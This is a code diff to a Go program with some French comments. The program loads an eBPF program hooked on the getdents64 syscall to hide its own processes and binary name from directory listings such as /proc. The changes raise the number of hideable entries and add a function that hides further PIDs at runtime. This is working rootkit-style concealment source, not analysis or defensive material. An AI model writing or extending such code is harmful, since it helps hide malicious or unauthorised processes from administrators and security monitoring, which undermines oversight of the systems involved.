@@ -20,7 +20,7 @@ var getDentsObj []byte
 
 const (
 	BpfObjPath = "bpf/getdents.o"
-	MaxHidden  = 16
+	MaxHidden  = 64
 	MaxNameLen = 100
 )
 
@@ -30,7 +30,7 @@ type HiddenEntry struct {
 	IsPrefix uint8
 }
 
-// matchesBinary returns true if the process with pid matches the binary name (exe or cmdline)
+// matchesBinary returns true if the process with pid matches the binary name
 func matchesBinary(pid int, binaryName string) bool {
 	exePath := fmt.Sprintf("/proc/%d/exe", pid)
 	target, err := os.Readlink(exePath)
@@ -95,8 +95,10 @@ func loadGetdentsBPF() (*ebpf.Collection, error) {
 // populateHiddenEntries ajoute les PIDs et le nom du binaire à la map hidden_entries.
 func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) error {
 	idx := 0
+
 	for _, val := range append(pids, -1) {
 		if idx >= MaxHidden {
+			fmt.Printf("⚠️ MaxHidden (%d) reached, some PIDs may not be hidden\n", MaxHidden)
 			break
 		}
 		var entry HiddenEntry
@@ -137,13 +139,11 @@ func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) erro
 }
 
 // HideOwnPIDs loads the BPF program and populates the hidden_entries map with this program's PIDs.
-// Peut prendre des PIDs supplémentaires à cacher à chaud (extraPIDs...)
 func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	pids, err := getYodaPIDs()
 	if err != nil {
 		return nil, nil, err
 	}
-	mergedPIDs := mergeUniquePIDs(pids, extraPIDs)
 
 	binName, err := getBinaryName()
 	if err != nil {
@@ -157,9 +157,12 @@ func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	if !ok {
 		return nil, nil, fmt.Errorf("hidden_entries map not found in BPF object")
 	}
-	if err := populateHiddenEntries(hiddenMap, mergedPIDs, binName); err != nil {
+	if err := populateHiddenEntries(hiddenMap, pids, binName); err != nil {
 		return nil, nil, err
 	}
+
+	globalCollection = coll
+	globalHiddenMap = hiddenMap
 
 	enterProg, ok := coll.Programs["hook_getdents64_enter"]
 	if !ok {
@@ -178,30 +181,68 @@ func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 		enterLink.Close()
 		return nil, nil, fmt.Errorf("failed to attach sys_exit_getdents64: %w", err)
 	}
-	fmt.Printf("👻 Hidden PIDs: %v\n\n", mergedPIDs)
+	fmt.Printf("👻 Hidden PIDs: %v\n\n", pids)
 	return enterLink, exitLink, nil
 
 }
 
-func mergeUniquePIDs(a, b []int) []int {
-	pidSet := make(map[int]struct{}, len(a)+len(b))
-	for _, pid := range a {
-		pidSet[pid] = struct{}{}
+var (
+	globalCollection *ebpf.Collection
+	globalHiddenMap  *ebpf.Map
+)
+
+func AddPIDToHiding(pid int) error {
+	if globalHiddenMap == nil {
+		return fmt.Errorf("eBPF hiding not initialized, call HideOwnPIDs() first")
 	}
-	for _, pid := range b {
-		pidSet[pid] = struct{}{}
+
+	var nextIdx uint32 = MaxHidden
+	for i := uint32(0); i < MaxHidden; i++ {
+		var entry HiddenEntry
+		err := globalHiddenMap.Lookup(&i, &entry)
+		if err != nil {
+			continue
+		}
+
+		if entry.NameLen == 0 {
+			nextIdx = i
+			break
+		}
+
+		pidStr := strconv.Itoa(pid)
+		if entry.NameLen == int32(len(pidStr)) &&
+			string(entry.Name[:entry.NameLen]) == pidStr {
+			fmt.Printf("🔒 PID %d already hidden\n", pid)
+			return nil
+		}
 	}
-	merged := make([]int, 0, len(pidSet))
-	for pid := range pidSet {
-		merged = append(merged, pid)
+
+	if nextIdx >= MaxHidden {
+		return fmt.Errorf("cannot add PID %d: map is full (%d/%d)", pid, nextIdx, MaxHidden)
 	}
-	return merged
+
+	var entry HiddenEntry
+	pidStr := strconv.Itoa(pid)
+	copy(entry.Name[:], pidStr)
+	entry.NameLen = int32(len(pidStr))
+	entry.IsPrefix = 0
+
+	key := nextIdx
+	if err := globalHiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
+		return fmt.Errorf("failed to add PID %d to map[%d]: %w", pid, nextIdx, err)
+	}
+	return nil
 }
 
 func CloseLinks(links ...link.Link) {
 	for _, l := range links {
 		if l != nil {
-			_ = l.Close()
+			l.Close()
 		}
+	}
+	if len(links) >= 2 && globalCollection != nil {
+		globalCollection.Close()
+		globalCollection = nil
+		globalHiddenMap = nil
 	}
 }
